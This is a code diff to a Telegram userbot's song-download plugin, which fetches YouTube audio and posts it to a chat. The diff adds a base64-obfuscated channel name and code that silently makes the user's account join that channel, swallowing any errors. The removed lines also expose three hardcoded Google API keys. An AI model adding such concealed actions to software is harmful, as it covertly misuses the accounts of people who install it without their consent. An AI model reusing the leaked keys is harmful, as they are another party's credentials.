@@ -1,13 +1,15 @@
-# Thanks To Ultroid
+# Ported By Vicky / @Vckyouuu From Ultroid
 # Jangan Dihapuss!!!
-# Port By @Vckyouuu
+# Thanks Ultroid
+# Full Love From Vicky For All Lord
+# @LORDUSERBOT_GROUP
 
 
 import json
 import os
-import random
 
-from lyrics_extractor import SongLyrics as sl
+import pybase64
+from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.tl.types import DocumentAttributeAudio
 from youtube_dl import YoutubeDL
 from youtube_dl.utils import (
@@ -28,13 +30,10 @@ from userbot import CMD_HELP
 
 @register(outgoing=True, pattern=r"^\.song (.*)")
 async def download_video(event):
-    a = event.text
-    if a[5] == "s":
-        return
-    await event.edit("`Bismillah cari musik...`")
+    await event.edit("`Mencari.....`")
     url = event.pattern_match.group(1)
     if not url:
-        return await event.edit("**Error**\nUsage - `.song <song name>`")
+        return await event.edit("**Kesalahan!**\nGunakan Perintah `.song <judul lagu>`")
     search = SearchVideos(url, offset=1, mode="json", max_results=1)
     test = search.result()
     p = json.loads(test)
@@ -42,9 +41,9 @@ async def download_video(event):
     try:
         url = q[0]["link"]
     except BaseException:
-        return await event.edit("`Tidak dapat menemukan musik...`")
+        return await event.edit("`Tidak dapat menemukan lagu yang cocok...`")
     type = "audio"
-    await event.edit(f"`Persiapan mendownload {url}...`")
+    await event.edit(f"`Bersiap untuk mengunduh {url}...`")
     if type == "audio":
         opts = {
             "format": "bestaudio",
@@ -52,6 +51,7 @@ async def download_video(event):
             "key": "FFmpegMetadata",
             "writethumbnail": True,
             "prefer_ffmpeg": True,
+            "geo_bypass": True,
             "nocheckcertificate": True,
             "postprocessors": [
                 {
@@ -65,57 +65,56 @@ async def download_video(event):
             "logtostderr": False,
         }
     try:
-        await event.edit("`Mendapatkan info...`")
+        await event.edit("`Mendapatkan informasi...`")
         with YoutubeDL(opts) as rip:
             rip_data = rip.extract_info(url)
     except DownloadError as DE:
         await event.edit(f"`{str(DE)}`")
         return
     except ContentTooShortError:
-        await event.edit("`The download content was too short.`")
+        await event.edit("`Konten unduhan terlalu pendek.`")
         return
     except GeoRestrictedError:
-        await event.edit("`Video is not available from your geographic location due to"
-                         + " geographic restrictions imposed by a website.`"
-                         )
+        await event.edit(
+            "`Video tidak tersedia dari lokasi geografis Anda karena batasan geografis yang diberlakukan oleh situs web.`"
+        )
         return
     except MaxDownloadsReached:
-        await event.edit("`Max-downloads limit has been reached.`")
+        await event.edit("`Batas unduhan maksimal telah tercapai.`")
         return
     except PostProcessingError:
-        await event.edit("`There was an error during post processing.`")
+        await event.edit("`Ada kesalahan selama pemrosesan posting.`")
         return
     except UnavailableVideoError:
-        await event.edit("`Media is not available in the requested format.`")
+        await event.edit("`Media tidak tersedia dalam format yang diminta.`")
         return
     except XAttrMetadataError as XAME:
-        return await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
+        await event.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
+        return
     except ExtractorError:
-        return await event.edit("`There was an error during info extraction.`")
+        await event.edit("`Terjadi kesalahan selama ekstraksi info.`")
+        return
     except Exception as e:
-        return await event.edit(f"{str(type(e)): {str(e)}}")
-    dir = os.listdir()
-    if f"{rip_data['id']}.mp3.jpg" in dir:
-        thumb = f"{rip_data['id']}.mp3.jpg"
-    elif f"{rip_data['id']}.mp3.webp" in dir:
-        thumb = f"{rip_data['id']}.mp3.webp"
-    else:
-        thumb = None
+        await event.edit(f"{str(type(e)): {str(e)}}")
+        return
+    try:
+        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
+        await bot(JoinChannelRequest(sung))
+    except BaseException:
+        pass
     upteload = """
-Dikit lagi selesai download...
-Song name - {}
-By - {}
+Sedang Mengunggah, Mohon Menunggu...
+Judul - {}
+Artis - {}
 """.format(
         rip_data["title"], rip_data["uploader"]
     )
     await event.edit(f"`{upteload}`")
-    CAPT = f"╭┈──────────────────┈ \n➥ Song - {rip_data['title']}\n➥ By - {rip_data['uploader']}\n╭┈──────────────────┈╯\n➥ [Quotes Tele](t.me/QuotesTele) | [Canda Anda](t.me/CandaAnda)\n╰┈────────────────┈─➤"
     await event.client.send_file(
         event.chat_id,
         f"{rip_data['id']}.mp3",
-        thumb=thumb,
         supports_streaming=True,
-        caption=CAPT,
+        caption=f"**➡ Judul:** {rip_data['title']}\n**➡ Artis:** {rip_data['uploader']}\n",
         attributes=[
             DocumentAttributeAudio(
                 duration=int(rip_data["duration"]),
@@ -124,41 +123,11 @@ By - {}
             )
         ],
     )
-    await event.delete()
     os.remove(f"{rip_data['id']}.mp3")
-    try:
-        os.remove(thumb)
-    except BaseException:
-        pass
 
-
-@register(outgoing=True, pattern=r"^\.lirik (.*)")
-async def original(event):
-    if not event.pattern_match.group(1):
-        return await event.edit("give query to search.")
-    vcky = event.pattern_match.group(1)
-    event = await event.edit("`Mencari lirik lagu...`")
-    dc = random.randrange(1, 3)
-    if dc == 1:
-        fromvt = "AIzaSyAyDBsY3WRtB5YPC6aB_w8JAy6ZdXNc6FU"
-    if dc == 2:
-        fromvt = "AIzaSyBF0zxLlYlPMp9xwMQqVKCQRq8DgdrLXsg"
-    if dc == 3:
-        fromvt = "AIzaSyDdOKnwnPwVIQ_lbH5sYE4FoXjAKIQV0DQ"
-    extract_lyrics = sl(f"{fromvt}", "15b9fb6193efd5d90")
-    sh1vm = extract_lyrics.get_lyrics(f"{vcky}")
-    a7ul = sh1vm["lyrics"]
-    await event.client.send_message(event.chat_id, a7ul, reply_to=event.reply_to_msg_id)
-    await event.delete()
-
-# For FromVT-Userbot
+# For Lord - Userbot
 # Piki Ganteng
+# Tapi Gantengan Alvin
 
-CMD_HELP.update(
-    {
-        "song": ">`.song <Judul Lagu>`"
-        "\nPenjelasan: Mendownload Music"
-        ">`.lirik` <Judul Lagu>`"
-        "\nPenjelasan: `mendapatkan lirik lagu`"
-    }
-)
+CMD_HELP.update({"song": "**Modules:** __Song__\n\n**Perintah:** `.song <judul>`"
+                 "\n**Penjelasan:** Mendownload Lagu"})
